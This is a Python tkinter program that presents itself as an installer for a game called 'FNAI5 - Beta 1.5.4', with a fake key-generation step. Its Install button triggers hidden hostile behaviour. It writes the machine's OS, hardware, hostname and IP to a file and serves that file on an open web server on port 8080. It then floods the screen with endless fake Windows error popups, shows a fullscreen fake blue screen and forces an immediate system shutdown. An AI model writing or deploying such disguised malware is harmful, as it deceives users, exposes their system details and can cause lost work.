import tkinter as tk
import random
import string
import os
import threading
import time
import winsound
import platform
import socket
import psutil
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

RESOURCE_FOLDER = "winhelperhost.mui"

generated_key = None
key_window = None
error_window = None

def generate_random_key():
    characters = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(characters, k=8))

def animate_key(entry, key, index=0):
    if index < len(key):
        entry.insert(tk.END, key[index])
        entry.after(100, lambda: animate_key(entry, key, index + 1))

def show_error_window():
    global generated_key, key_window, error_window
    generated_key = None

    if key_window:
        key_window.destroy()
        key_window = None

    error_window = tk.Toplevel()
    error_window.title("")
    error_window.geometry("320x140")
    error_window.resizable(False, False)
    error_window.configure(bg="#3e3e3e")
    try:
        error_window.iconbitmap(os.path.join(RESOURCE_FOLDER, 'icon.ico'))
    except:
        pass

    tk.Label(error_window, text="ERROR:516 (Key=False)", fg="red", bg="#3e3e3e",
             font=('Arial', 14, 'bold')).pack(pady=10)
    tk.Label(error_window, text="Generate the key again!", fg="white", bg="#3e3e3e",
             font=('Arial', 10)).pack()

def open_key_window():
    global generated_key, key_window, error_window

    if error_window:
        error_window.destroy()
        error_window = None

    def handle_generate():
        nonlocal entry
        global generated_key
        generated_key = generate_random_key()
        entry.delete(0, tk.END)
        animate_key(entry, generated_key)

    key_window = tk.Toplevel()
    key_window.title("")
    key_window.geometry("420x100")
    key_window.resizable(False, False)
    key_window.configure(bg="#4e4e4e")
    try:
        key_window.iconbitmap(os.path.join(RESOURCE_FOLDER, 'icon.ico'))
    except:
        pass

    gen_button = tk.Button(key_window, text="GenKey", command=handle_generate,
                           bg="#d3d3d3", font=('Arial', 10, 'bold'))
    gen_button.pack(side=tk.LEFT, padx=10, pady=30)

    entry = tk.Entry(key_window, width=30, font=('Courier', 12), bg="#eeeeee", justify='left')
    entry.pack(side=tk.LEFT, padx=10)

def verify_code():
    global generated_key
    entered_code = code_entry.get()
    if entered_code == generated_key:
        install_button.config(state=tk.NORMAL)
    else:
        show_error_window()

def collect_system_info():
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=True),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }
    with open("system_info.txt", "w") as f:
        json.dump(info, f, indent=4)

class SystemInfoHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            try:
                with open("system_info.txt", "r") as f:
                    data = json.load(f)
                html = "<html><body><h1>System Information</h1><ul>"
                for key, value in data.items():
                    html += f"<li><strong>{key}</strong>: {value}</li>"
                html += "</ul></body></html>"

                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))
            except Exception as e:
                self.send_error(500, f"Error reading system info: {e}")
        else:
            self.send_error(404, "Page not found")

def start_web_server():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, SystemInfoHandler)
    print("Веб-сервер запущено на порту 8080")
    httpd.serve_forever()

POPUPS = [
    {
        "title": "System Error",
        "message": "A critical system error has occurred. (0xC0000005)",
        "icon": "error.ico",
        "image": "error.png",
        "sound": lambda: winsound.MessageBeep(winsound.MB_ICONHAND),
        "details": "Please contact your system administrator immediately."
    },
    {
        "title": "Windows Security Warning",
        "message": "Your system may be at risk. Please check security settings.",
        "icon": "warning.ico",
        "image": "warning.png",
        "sound": lambda: winsound.PlaySound(os.path.join(RESOURCE_FOLDER, "warning.wav"), winsound.SND_FILENAME | winsound.SND_ASYNC),
        "details": "Security settings may be outdated or disabled."
    },
    {
        "title": "System",
        "message": "System update completed successfully.",
        "icon": "info.ico",
        "image": "info.png",
        "sound": lambda: winsound.MessageBeep(winsound.MB_ICONASTERISK),
        "details": "No further action is required."
    },
    {
        "title": "System",
        "message": "Do you want to restart now?",
        "icon": "question.ico",
        "image": "question.png",
        "sound": lambda: winsound.MessageBeep(winsound.MB_ICONQUESTION),
        "details": "Restarting now will apply recent changes."
    }
]

def create_error_window():
    popup = random.choice(POPUPS)
    popup["sound"]()
    window = tk.Tk()
    window.title(popup["title"])
    window.geometry(f"500x200+{random.randint(100, 800)}+{random.randint(100, 500)}")
    window.configure(bg="white")
    window.resizable(False, False)

    icon_path = os.path.join(RESOURCE_FOLDER, popup["icon"])
    image_path = os.path.join(RESOURCE_FOLDER, popup["image"])

    if os.path.exists(icon_path):
        try:
            window.iconbitmap(icon_path)
        except Exception as e:
            print("Icon error:", e)

    frame = tk.Frame(window, bg="white")
    frame.pack(padx=20, pady=20, fill="both", expand=True)

    icon_label = tk.Label(frame, bg="white")
    if os.path.exists(image_path):
        try:
            image = tk.PhotoImage(file=image_path)
            icon_label.configure(image=image)
            icon_label.image = image
        except Exception as e:
            print("Image error:", e)
            icon_label.configure(text="[!]", font=("Segoe UI", 24), fg="red")
    else:
        icon_label.configure(text="[!]", font=("Segoe UI", 24), fg="red")
    icon_label.grid(row=0, column=0, rowspan=3, sticky="n")

    text_label = tk.Label(frame, text=popup["message"], justify="left", bg="white", font=("Segoe UI", 9, "bold"), wraplength=360)
    text_label.grid(row=0, column=1, sticky="w", padx=10)

    details_label = tk.Label(frame, text=popup["details"], justify="left", bg="white", font=("Segoe UI", 9), wraplength=360, fg="gray")
    details_label.grid(row=1, column=1, sticky="nw", padx=10, pady=(5, 0))

    window.attributes("-topmost", True)
    window.mainloop()

def fake_bsod_then_shutdown():
    def bsod_screen():
        bsod = tk.Tk()
        bsod.attributes("-fullscreen", True)
        bsod.configure(bg="#0000AA")
        bsod.title(" ")
        label = tk.Label(
            bsod,
            text=(
                "A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
                "If this is the first time you've seen this Stop error screen,\n"
                "restart your computer. If this screen appears again, follow\n"
                "these steps:\n\n"
                "Check to make sure any new hardware or software is properly installed.\n"
                "If this is a new installation, ask your hardware or software manufacturer\n"
                "for any Windows updates you might need.\n\n"
                "*** STOP: 0x0000007B (0xF78D2524, 0xC0000034, 0x00000000, 0x00000000)"
            ),
            fg="white",
            bg="#0000AA",
            font=("Consolas", 14),
            justify="left",
            anchor="nw",
            padx=50,
            pady=50
        )
        label.pack(fill="both", expand=True)
        bsod.mainloop()

    threading.Thread(target=bsod_screen).start()

    def shutdown():
        time.sleep(15)
        os.system("shutdown /s /t 0")

    threading.Thread(target=shutdown).start()

def spam_windows():
    while True:
        threading.Thread(target=create_error_window, daemon=True).start()
        time.sleep(0.3)

def launch_embedded_script():
    collect_system_info()
    threading.Thread(target=start_web_server, daemon=True).start()
    threading.Timer(20, fake_bsod_then_shutdown).start()
    threading.Thread(target=spam_windows, daemon=True).start()
    root.destroy()

# === Головне вікно ===

root = tk.Tk()
root.title("FNAI5-Beta 1.5.4 Installer")
root.geometry("600x300")
root.resizable(False, False)
root.configure(bg="#2e2e2e")
try:
    root.iconbitmap(os.path.join(RESOURCE_FOLDER, 'icon.ico'))
except:
    pass

title_label = tk.Label(root, text="FNAI5 - Beta 1.5.4 Installer", font=("Arial", 18, "bold"),
                       fg="white", bg="#2e2e2e")
title_label.pack(pady=20)

code_entry = tk.Entry(root, font=('Courier', 16), width=30, justify='center', bg="#dddddd")
code_entry.place(relx=0.5, rely=0.4, anchor='center')

generate_button = tk.Button(root, text="Generate Key", bg="white", font=('Arial', 10, 'bold'),
                            command=open_key_window)
generate_button.place(relx=0.0, rely=1.0, anchor='sw', x=10, y=-10)

install_button = tk.Button(root, text="Install", bg="green", fg="white", font=('Arial', 10, 'bold'),
                           state=tk.DISABLED, command=launch_embedded_script)
install_button.place(relx=1.0, rely=1.0, anchor='se', x=-10, y=-10)

confirm_button = tk.Button(root, text="Confirm", command=verify_code, font=('Arial', 10),
                           bg="#a0a0a0")
confirm_button.place(relx=0.5, rely=0.6, anchor='center')

root.mainloop()
